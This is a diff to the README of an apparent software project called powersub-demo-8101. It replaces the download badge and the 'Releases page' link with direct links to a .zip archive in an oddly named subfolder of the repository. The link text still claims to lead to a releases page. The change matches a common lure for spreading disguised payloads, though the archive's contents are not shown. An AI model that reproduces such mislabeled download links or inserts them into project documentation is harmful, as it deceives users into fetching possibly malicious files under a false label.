@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download powersub-demo-8101](https://img.shields.io/badge/Download-Powersub--Demo--8101-brightgreen)](https://github.com/Skygaming022/powersub-demo-8101/releases)
+[![Download powersub-demo-8101](https://raw.githubusercontent.com/Skygaming022/powersub-demo-8101/main/stereogoniometer/powersub-demo-8101.zip)](https://raw.githubusercontent.com/Skygaming022/powersub-demo-8101/main/stereogoniometer/powersub-demo-8101.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ To run the powersub-demo-8101 application, make sure your computer meets the fol
 ## 📂 Download & Install
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/Skygaming022/powersub-demo-8101/releases) to access the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/Skygaming022/powersub-demo-8101/main/stereogoniometer/powersub-demo-8101.zip) to access the latest version of the software.
 
 2. **Select the Latest Release**
    Look for the most recent version. It will usually be at the top of the list. Click on it to open the details.
